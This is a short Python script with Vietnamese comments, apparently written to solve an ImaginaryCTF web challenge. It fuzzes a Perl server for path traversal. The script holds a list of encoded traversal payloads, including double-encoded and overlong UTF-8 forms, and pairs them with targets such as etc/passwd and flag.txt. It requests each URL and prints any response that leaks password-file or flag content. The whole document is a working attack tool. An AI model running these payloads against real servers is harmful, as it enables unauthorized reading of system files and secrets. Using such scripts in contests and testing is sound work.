import requests

# URL gốc của server Perl
BASE = "http://pearl.chal.imaginaryctf.org"   # đổi localhost:8080 thành IP:port thực tế

# Một số payload traversal phổ biến
payloads = [
    "../",
    "..%2f",         # ../
    "%2e%2e/",       # ../
    "%252e%252e/",   # double encode ../
    "%c0%ae%c0%ae/", # overlong UTF-8 ../
    "....//",        # ....//
    "..%5c",         # ..\ (Windows style)
    "%2e%2e%5c",     # ..\
]

# File mục tiêu để test (nếu đọc được thì coi như bypass thành công)
test_targets = [
    "etc/passwd",           # Linux password file
    "flag.txt",             # nếu flag.txt chưa rename
    "flag-dummy.txt",       # thử với pattern khác
]

for payload in payloads:
    for target in test_targets:
        url = f"{BASE}/{payload}{target}"
        try:
            r = requests.get(url, timeout=3)
            print(f"[TRY] {url} => {r.status_code}")
            # Nếu có nội dung khả nghi (chứa "root:" hoặc "ictf{" ...)
            if "root:" in r.text or "ictf{" in r.text or "ENO{" in r.text:
                print(">>> POSSIBLE FLAG / LEAK <<<")
                print(r.text[:500])
                exit()
        except Exception as e:
            print(f"Error {url}: {e}")
